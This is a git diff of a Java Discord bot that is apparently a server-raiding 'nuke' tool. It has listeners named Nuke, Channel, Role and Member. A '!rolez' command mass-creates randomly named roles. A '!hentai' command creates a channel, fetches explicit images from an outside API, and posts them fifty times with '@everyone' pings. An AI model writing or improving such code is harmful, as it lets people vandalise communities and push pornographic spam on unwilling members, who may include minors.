@@ -1,5 +1,6 @@
 package wtf.gun.maou;
 
+import com.google.gson.JsonParser;
 import io.github.cdimascio.dotenv.Dotenv;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -13,10 +14,12 @@ import net.dv8tion.jda.api.utils.MemberCachePolicy;
 import net.dv8tion.jda.api.utils.cache.CacheFlag;
 import org.jetbrains.annotations.NotNull;
 
-import java.io.FileNotFoundException;
+import java.io.*;
+import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
-import java.io.File;
-import java.util.Scanner;
+import java.util.concurrent.ThreadLocalRandom;
 import java.util.concurrent.TimeUnit;
 
 public final class Bot {
@@ -35,7 +38,7 @@ public final class Bot {
                 .enableCache(CacheFlag.FORUM_TAGS)
                 .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                 // Initialize commands
-                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Porn(), new Rolez())
+                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Hentai(), new Rolez())
                 .build()
                 .awaitReady();
     }
@@ -79,44 +82,65 @@ public final class Bot {
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!rolez")) return;
             Guild guild = event.getGuild();
-
             Random random = new Random();
-            int color = random.nextInt();
-            int colors = color + random.nextInt();
 
             // For loop to create roles
             for (int i = 0; i < 10; i++) {
-                guild.createRole().setName("BEAMED").setColor(colors).queue(role -> role.createCopy());
+                StringBuilder builder = new StringBuilder();
+                int color = random.nextInt();
+
+                for (int j = 0; j < 10; j++) {
+                    char c = (char)(random.nextInt(26) + 'a');
+                    builder.append(c);
+                }
+
+                guild.createRole().setName(builder.toString().toUpperCase()).setColor(color).queue(role -> role.createCopy().queue());
             }
             event.getMessage().delete().queue();
         }
     }
 
-    // Create x channels and spam porn x times in each channel
-    private static final class Porn extends ListenerAdapter {
+    public static String getRandomItem(List<String> list) {
+        return list.get(ThreadLocalRandom.current().nextInt(list.size()));
+    }
+
+    // Create x channels and spam hentai x times in each channel
+    private static final class Hentai extends ListenerAdapter {
         @Override
         public void onMessageReceived(@NotNull MessageReceivedEvent event) {
-            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!porn")) return;
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hentai")) return;
             Guild guild = event.getGuild();
+
+/*            List<String> lines = new ArrayList<>();
+
+            try (BufferedReader reader = new BufferedReader(new FileReader("random.txt"))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    lines.add(line);
+                }
+            } catch (IOException e) {
+                // Handle the exception
+            }*/
 
             // For loop to create channels
             for (int i = 0; i < 1; i++) {
-                guild.createTextChannel("sex").queue(textChannel -> {
+                guild.createTextChannel("anime").queue(textChannel -> {
                     // For loop to spam prn in channels
                     for (int j = 0; j < 50; j++) {
+
+                        StringBuilder builder = new StringBuilder();
                         try {
-                            File files = new File("random.txt");
-                            int c = 0;
-                            Scanner scanner = new Scanner(files);
-                            while (scanner.hasNextLine()) {
-                                String l = scanner.nextLine();
-                                c++;
-                                Random random = new Random();
-                                int r = random.nextInt(c);
-                                //textChannel.sendMessage("@everyone\n" + c).queue();
-                                System.out.println(c);
+                            URL url = new URL("http://api.nekos.fun:8080/api/hentai");
+                            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
+                            String line;
+                            while ((line = reader.readLine()) != null) {
+                                builder.append(line);
                             }
-                        } catch (FileNotFoundException e) {}
+                        } catch (IOException e) {}
+
+                        String json = JsonParser.parseString(builder.toString()).getAsJsonObject().get("image").getAsString();
+
+                        textChannel.sendMessage("@everyone\n" + json).queue();
                     }
                 });
             }
